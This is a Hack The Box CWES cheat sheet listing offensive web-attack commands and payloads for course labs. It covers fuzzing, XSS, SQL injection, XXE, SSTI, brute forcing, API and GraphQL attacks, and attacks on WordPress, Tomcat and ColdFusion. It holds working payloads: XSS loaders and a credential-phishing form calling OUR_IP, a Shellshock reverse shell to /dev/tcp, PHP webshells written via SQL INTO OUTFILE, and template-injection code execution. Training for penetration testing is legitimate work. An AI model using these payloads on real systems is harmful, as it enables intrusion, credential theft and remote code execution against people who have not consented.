# CWES
HTB CWES cheet sheet. This section describes the commands learned during the CWES, omitting the most basic commands and theoretical parts.

## Information Gathering
``` Bash
g4man@htb[/htb]$ whois facebook.com
```
``` Bash
g4man@htb[/htb]$ dig google.com
```
``` Bash
g4man@htb[/htb]$ dnsenum --enum inlanefreight.com -f  /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt 
```
``` Bash
g4man@htb[/htb]$ dig axfr @nsztm1.digi.ninja zonetransfer.me
```
``` Bash
g4man@htb[/htb]$ gobuster vhost -u http://inlanefreight.htb:81 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
```
``` Bash
g4man@htb[/htb]$ nikto -h inlanefreight.com -Tuning b
```
``` Bash
g4man@htb[/htb]$ python3 ReconSpider.py http://inlanefreight.com
```

## Web fuzzing

### Directory and file fuzzing
``` Bash
g4man@htb[/htb]$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://IP:PORT/FUZZ
g4man@htb[/htb]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/common.txt -u http://94.237.57.1:42381/webfuzzing_hidden_path/flag/FUZZ.html
g4man@htb[/htb]$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -ic -u http://IP:PORT/FUZZ -e .html -recursion -recursion-depth 2 -rate 500
```

### Fuzzing parameters
``` Bash
g4man@htb[/htb]$ wenum -w /usr/share/seclists/Discovery/Web-Content/common.txt --hc 404 -u "http://IP:PORT/get.php?x=FUZZ"
g4man@htb[/htb]$ ffuf -u http://IP:PORT/post.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "y=FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200 -v
```

### Subdomain fuzz
``` Bash
g4man@htb[/htb]$ gobuster vhost -u http://inlanefreight.htb:81 -w /usr/share/seclists/Discovery/Web-Content/common.txt --append-domain
g4man@htb[/htb]$ gobuster dns -d inlanefreight.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt 
```

### Filtering fuzzing output
``` Bash
g4man@htb[/htb]$ ffuf -u http://IP:PORT/post.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "y=FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -v
g4man@htb[/htb]$ ffuf -u http://IP:PORT/post.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "y=FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -v -mc all 
```

### API fuzzing
``` Bash
g4man@htb[/htb]$ git clone https://github.com/PandaSt0rm/webfuzz_api.git
g4man@htb[/htb]$ cd webfuzz_api
g4man@htb[/htb]$ pip3 install -r requirements.txt
g4man@htb[/htb]$ python3 api_fuzzer.py http://IP:PORT
```

## Javascript Deofuscation

To ofuscate js use: https://obfuscator.io  
To deofuscate js use: https://matthewfl.com/unPacker.html

## Cross-site scripting XSS

Payloads used during the training 
``` 
<script>alert(window.origin)</script>
<img src="" onerror=alert(window.origin)>
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
<script src="http://OUR_IP/script.js"></script>
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```

Automatic tool
``` bash
g4man@htb[/htb]$ python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" 
```

## SQL injection

### Basic payloads
| Payload | URL Encoded |
|---------:|:------------|
| `'`      | `%27`       |
| `"`      | `%22`       |
| `#`      | `%23`       |
| `;`      | `%3B`       |
| `)`      | `%29`       |

### More payloads

``` Bash
admin' or '1'='1
admin'--
admin')--
cn' UNION select 1,@@version,3,4-- -
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

### SQLMap Essentials

``` Bash
g4man@htb[/htb]$ sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
g4man@htb[/htb]$ sqlmap -u www.target.com --data='id=1' --method PUT
g4man@htb[/htb]$ sqlmap -r req.txt
g4man@htb[/htb]$ sqlmap -u www.example.com/?id=1 -v 3 --level=5
g4man@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
g4man@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
g4man@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb
g4man@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
g4man@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users
g4man@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --passwords --batch
g4man@htb[/htb]$ sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
g4man@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --os-shell
```

## Command Injection
| Injection Operator | Injection Character | URL-Encoded Character | Executed Command |
|--------------------|:-------------------:|:---------------------:|:-----------------|
| Semicolon | ; | %3b | Both |
| New Line | \n | %0a | Both |
| Background |& | %26 | Both (second output generally shown first) |
| Pipe |	\| |	 %7c | Both (only second output is shown) | 
| AND |	&&	|%26%26|	Both (only if first succeeds)|
| OR |	\|\|	|%7c%7c	|Second (only if first fails) |
| Sub-Shell  |`` | %60%60 |	Both (Linux-only) |
| Sub-Shell |	$() |	%24%28%29 |	Both (Linux-only) |

### Injections types
| Injection Type | Operators |
|---------------:|:----------|
|SQL Injection | ' , ; -- /* */|
|Command Injection | ; && |
|LDAP Injection | * ( ) & \||
|XPath Injection |	' or and not substring concat count |
|OS Command Injection | ; & \||
|Code Injection	| ' ; -- /* */ $() ${} #{} %{} ^|
|Directory Traversal/File Path Traversal	| ../ ..\\ %00 |
|Object Injection |	; & \||
|XQuery Injection | ' ; -- /* */ |
|Shellcode Injection |	\x \u %u %n |
|Header Injection |	\n \r\n \t %0d %0a %09 |

## File Upload Attacks 
Webshell.php
``` Bash
<?php system($_REQUEST['cmd']); ?>
```

XXS via Exiftool
``` Bash
g4man@htb[/htb]$ exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
```

XXE
``` Bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

XXE Remote
``` Bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

## Server Side

### SSRF
``` Bash
$ seq 1 10000 > ports.txt
$ ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"
g4man@htb[/htb]$ ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80"
```

### SSTI
#### Jinja
``` Bash
{{ config.items() }}
{{ self.__init__.__globals__.__builtins__ }}
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

#### Twing
``` Bash
{{ _self }}
{{ "/etc/passwd"|file_excerpt(1,-1) }}
{{ ['id'] | filter('system') }}
```

#### Automatic Tool
``` Bash
g4man@htb[/htb]$ git clone https://github.com/vladko312/SSTImap=
g4man@htb[/htb]$ cd SSTImap
g4man@htb[/htb]$ pip3 install -r requirements.txt
g4man@htb[/htb]$ python3 sstimap.py 
g4man@htb[/htb]$ python3 sstimap.py -u http://172.17.0.2/index.php?name=test
```

### SSI Injection
Server-Side Includes (SSI) is a technology web applications use to create dynamic content on HTML pages. SSI is supported by many popular web servers such as Apache and IIS. 
``` Bash
<!--#printenv -->
<!--#exec cmd="id" -->
```

### XLST Injection
eXtensible Stylesheet Language Transformation (XSLT) is a language enabling the transformation of XML documents. For instance, it can select specific nodes from an XML document and change the XML structure.
#### LFI
``` Bash
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
```

#### RCE
``` Bash
<xsl:value-of select="php:function('system','id')" />
```

## Login brute force

### Using Hydra
``` Bash
g4man@htb[/htb]$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
g4man@htb[/htb]$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
g4man@htb[/htb]$ hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f IP -s 5000 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```

Custom wordlists
``` Bash
g4man@htb[/htb]$ sudo apt install ruby -y
g4man@htb[/htb]$ git clone https://github.com/urbanadventurer/username-anarchy.git
g4man@htb[/htb]$ cd username-anarchy
g4man@htb[/htb]$ ./username-anarchy Jane Smith > jane_smith_usernames.txt
g4man@htb[/htb]$ sudo apt install cupp -y
g4man@htb[/htb]$ grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
g4man@htb[/htb]$ hydra -L usernames.txt -P jane-filtered.txt IP -s PORT -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
```

## Broken authentication

### Enumerate users
``` Bash
$ ffuf -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=invalid" -fr "Unknown user"
```

### Brute-Forcing passwords
``` Bash
g4man@htb[/htb]$ grep '[[:upper:]]' /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt
g4man@htb[/htb]$ ffuf -w ./custom_wordlist.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username"
```

### Brute-Forcing Password Reset Tokens
``` Bash
g4man@htb[/htb]$ seq -w 0 9999 > tokens.txt
g4man@htb[/htb]$ ffuf -w ./tokens.txt -u http://weak_reset.htb/reset_password.php?token=FUZZ -fr "The provided token is invalid"
```

### Brute-Forcing 2FA Codes
``` Bash
g4man@htb[/htb]$ ffuf -w ./tokens.txt -u http://bf_2fa.htb/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=fpfcm5b8dh1ibfa7idg0he7l93" -d "otp=FUZZ" -fr "Invalid 2FA Code"
```

### Vulnerable Password Reset
``` Bash
https://github.com/datasets/world-cities/blob/master/data/world-cities.csv
g4man@htb[/htb]$ cat world-cities.csv | cut -d ',' -f1 > city_wordlist.txt
g4man@htb[/htb]$ ffuf -w ./city_wordlist.txt -u http://pwreset.htb/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=39b54j201u3rhu4tab1pvdb4pv" -d "security_response=FUZZ" -fr "Incorrect response."
g4man@htb[/htb]$ cat world-cities.csv | grep Germany | cut -d ',' -f1 > german_cities.txt
```


## API Attacks
### Broken authorization
``` Bash
$ for ((i=1; i<= 20; i++)); do
curl -s -w "\n" -X 'GET' \
  'http://94.237.49.212:43104/api/v1/supplier-companies/yearly-reports/'$i'' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer TOKEN_JWT' | jq
done
```
### Authentication
``` Bash
g4man@htb[/htb]$ ffuf -w /opt/useful/seclists/Passwords/xato-net-10-million-passwords-10000.txt:PASS -w customerEmails.txt:EMAIL -u http://94.237.59.63:31874/api/v1/authentication/customers/sign-in -X POST -H "Content-Type: application/json" -d '{"Email": "EMAIL", "Password": "PASS"}' -fr "Invalid Credentials" -t 100
```
### SQLi in parameters
``` Bash
laptop' OR 1=1 --; 
```
## GraphQL
### Introspection
``` Bash
{
  __schema {
    types {
      name
    }
  }
}

```
``` Bash
{
   __type(name: "UserObject") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```
``` Bash
{
  __schema {
    queryType {
      fields {
        name
        description
      }
    }
  }
}
```
``` Bash
query {
  secrets {
    id
    secret
  }
}
```

IDOR
```Bash
{
  user(username: "test") {
    username
    password
  }
}
```

SQL
``` Bash
{
  user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -") {
    username
  }
}
```

``` Bash
{
  user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(column_name),4,5,6 FROM information_schema.columns WHERE table_name='flag'-- -") {
    username
  }
}
```

``` Bash
{
  user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(flag),4,5,6 FROM flag-- -") {
    username
  }
}
```

Batching attacks
``` Bash
[
    {
        "query":"{user(username: \"admin\") {uuid}}"
    },
    {
        "query":"{post(id: 1) {title}}"
    }
]
```

Mutations
``` Bash
mutation {
  registerUser(input: {username: "vautia", password: "5f4dcc3b5aa765d61d8327deb882cf99", role: "user", msg: "newUser"}) {
    user {
      username
      password
      msg
      role
    }
  }
}
```

### Tools for GraphQL
https://github.com/dolevf/graphql-cop  
https://github.com/doyensec/inql

## Attacking common applications
### Wordpress
Enumetarion
``` Bash
$ curl -s -X GET http://blog.inlanefreight.com | grep '<meta name="generator"'
g4man@htb[/htb]$ curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2
g4man@htb[/htb]$ curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2
$ curl -s -X GET http://blog.inlanefreight.com/wp-content/plugins/mail-masta/ | html2text
```
User enumeration
``` Bash
g4man@htb[/htb]$ curl -s -I http://blog.inlanefreight.com/?author=1
g4man@htb[/htb]$ curl -s -I http://blog.inlanefreight.com/?author=100
g4man@htb[/htb]$ curl http://blog.inlanefreight.com/wp-json/wp/v2/users | jq
```
Login
``` Bash
g4man@htb[/htb]$ curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
g4man@htb[/htb]$ curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>asdasd</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
$ curl -X POST -d "<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>" http://94.237.122.123:34562/xmlrpc.php
```

WPScan
``` Bash
g4man@htb[/htb]$ gem install wpscan
g4man@htb[/htb]$ wpscan --url http://blog.inlanefreight.com --enumerate --api-token Kffr4fdJzy9qVcTk<SNIP>
```
LFI
``` Bash
 g4man@htb[/htb]$ curl http://blog.inlanefreight.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
 ```

 WordPress User Bruteforce
 ``` Bash
 g4man@htb[/htb]$ wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://blog.inlanefreight.com
 ```
 Exploit in metasploit exploit/unix/webapp/wp_admin_shell_upload
 ### Tomcat CGI
 ``` Bash
g4man@htb[/htb]$ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
g4man@htb[/htb]$ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
http://10.129.204.227:8080/cgi/welcome.bat?&dir
http://10.129.204.227:8080/cgi/welcome.bat?&set
http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
g4man@htb[/htb]$ gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
g4man@htb[/htb]$ curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi
g4man@htb[/htb]$ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
```
### Cloud Funsion
``` Bash
g4man@htb[/htb]$ searchsploit adobe coldfusion
http://example.com/index.cfm?directory=../../../etc/&file=passwd
http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../etc/passwd
g4man@htb[/htb]$ searchsploit -p 50057
```

### IIS Enumeration
``` Bash
g4man@htb[/htb]$ java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/
egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt
g4man@htb[/htb]$ gobuster dir -u http://10.129.204.231/ -w /tmp/list.txt -x .aspx,.asp
```

### Attacking LDAP
``` Bash
g4man@htb[/htb]$ ldapsearch -H ldap://ldap.example.com:389 -D "cn=admin,dc=example,dc=com" -w secret123 -b "ou=people,dc=example,dc=com" "(mail=john.doe@example.com)"
```